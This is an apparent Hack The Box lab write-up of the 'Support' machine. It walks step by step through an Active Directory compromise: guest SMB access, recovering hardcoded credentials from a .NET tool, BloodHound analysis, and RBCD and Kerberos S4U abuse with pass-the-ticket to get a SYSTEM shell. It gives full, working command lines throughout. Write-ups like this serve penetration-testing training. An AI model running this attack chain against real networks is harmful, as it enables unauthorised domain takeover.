---
title: "HTB Support Writeup"
date: 2026-06-26
tags: [oscp, active-directory, pentest]
---

## Summary

Support is an Active Directory machine that demonstrates several fundamental attack techniques:

- Anonymous SMB enumeration
- Reverse engineering a .NET application
- Recovering hardcoded credentials
- LDAP enumeration
- BloodHound attack path analysis
- Resource-Based Constrained Delegation (RBCD)
- Kerberos ticket abuse (S4U2Self/S4U2Proxy)
- Pass-the-Ticket

The initial foothold is obtained through credentials recovered from a .NET application found in an SMB share. After gaining access, BloodHound reveals a privilege escalation path via RBCD that ultimately leads to SYSTEM on the Domain Controller.

---

# Reconnaissance

## Port Scan

I started with a full TCP scan:

```bash
nmap -sCV -vv --disable-arp-ping --min-rate 5000 -p- 10.129.230.181 -oN fullport.nmap
```

### Key Findings

Several ports immediately suggested an Active Directory environment:

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MSRPC |
| 389 | LDAP |
| 445 | SMB |
| 5985 | WinRM |
| 3268 | Global Catalog LDAP |

The scan also revealed the domain name:

```text
support.htb
```

At this point the target was clearly identified as a Domain Controller.

To simplify name resolution, I added the domain to `/etc/hosts`:

```bash
echo "10.129.230.181 support.htb" | sudo tee -a /etc/hosts
```

Alternatively, NetExec can automatically populate the hosts file:

```bash
sudo nxc smb 10.129.230.181 --generate-hosts-file /etc/hosts
```

Result:

```text
10.129.230.181 DC.support.htb support.htb DC
```

---

# SMB Enumeration

## Anonymous Authentication

I tested anonymous SMB authentication:

```bash
nxc smb 10.129.230.181 -u '' -p '' --shares
```

Although anonymous authentication succeeded, share enumeration returned **STATUS_ACCESS_DENIED**.

## Guest Authentication

Next, I tested the built-in Guest account:

```bash
nxc smb 10.129.230.181 -u guest -p '' --shares
```

This time, share enumeration succeeded. Among the available shares, one immediately stood out:

```text
support-tools
```

This share was readable by Guest users and appeared to contain internal tools used by the organization's support staff.

---

# Analyzing the Support Tools

I downloaded the contents of the `support-tools` share and extracted the archive.

Inside it I found a .NET executable named **UserInfo.exe**.

Since .NET applications can easily be decompiled, I inspected the binary using ILSpy:

```bash
ilspycmd UserInfo.exe
```

During the analysis I found the following function:

```csharp
internal class Protected
{
    private static string enc_password = "...";

    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        ...
    }
}
```

The application stored an encrypted password as a Base64 string and recovered it using a simple XOR routine with the key `armando`.

Instead of executing the application, I reproduced the decryption logic in Python:

```python
import base64

enc_password = "..."
key = b"armando"

decoded = base64.b64decode(enc_password)
result = bytearray()

for i in range(len(decoded)):
    result.append(decoded[i] ^ key[i % len(key)] ^ 0xDF)

print(result.decode())
```

Output:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

# LDAP Enumeration

I tested the recovered credentials against LDAP:

```bash
nxc ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Authentication succeeded.

With valid domain credentials, I collected Active Directory data using RustHound:

```bash
rusthound-ce -d support.htb -i 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c All --zip
```

I also performed manual LDAP enumeration:

```bash
ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb" -W -b "DC=SUPPORT,DC=HTB" "(objectClass=*)"
```

During the enumeration I noticed that the **info** attribute of the `support` user contained plaintext credentials.

---

# User Access

BloodHound showed that the `support` account belonged to the **Remote Management Users** group, which allowed remote access through WinRM:

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

After authenticating successfully, I retrieved the user flag.

---

# Privilege Escalation

## Attack Path Analysis

After importing the BloodHound data, I found that the `support` account inherited **GenericAll** permissions over the Domain Controller computer object.

This immediately suggested the possibility of abusing **Resource-Based Constrained Delegation (RBCD)**.

Before attempting the attack, I verified the Machine Account Quota:

```bash
nxc ldap 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful' -M maq
```

Output:

```text
MachineAccountQuota: 10
```

Since the quota was greater than zero, the account was allowed to create new computer objects.

---

## Creating a Machine Account

I created a new computer account:

```bash
bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer z2k password123!
```

The computer account was successfully created.

---

## Configuring Resource-Based Constrained Delegation

Next, I configured the Domain Controller object so that my attacker-controlled computer account could impersonate users:

```bash
impacket-rbcd -delegate-from z2k$ -delegate-to DC$ -action write support.htb/support:Ironside47pleasure40Watchful
```

The delegation rights were successfully updated.

---

## Requesting a Kerberos Service Ticket

With RBCD configured, I requested a service ticket while impersonating the **Administrator** account:

```bash
getST.py -spn cifs/DC.support.htb -impersonate Administrator support.htb/z2k$:password123!
```

The ticket was generated through the Kerberos **S4U2Self** and **S4U2Proxy** extensions.

---

# Pass-the-Ticket

After exporting the generated ticket:

```bash
export KRB5CCNAME=Administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache
```

I authenticated to the Domain Controller without requiring the Administrator password:

```bash
impacket-psexec support.htb/Administrator@DC.support.htb -k -no-pass
```

The attack successfully resulted in a SYSTEM shell on the Domain Controller:

```text
C:\Windows\system32> whoami

nt authority\system
```

---

# Conclusion

Support is an excellent Active Directory machine that combines several attack techniques throughout the compromise process.

The complete attack chain was:

1. Anonymous SMB enumeration
2. Reverse engineering a .NET application
3. Recovering hardcoded credentials
4. LDAP enumeration
5. BloodHound privilege path discovery
6. Machine account creation
7. RBCD configuration
8. Kerberos ticket abuse (S4U2Self/S4U2Proxy)
9. Pass-the-Ticket

A single exposed internal tool with hardcoded credentials ultimately resulted in full domain compromise.
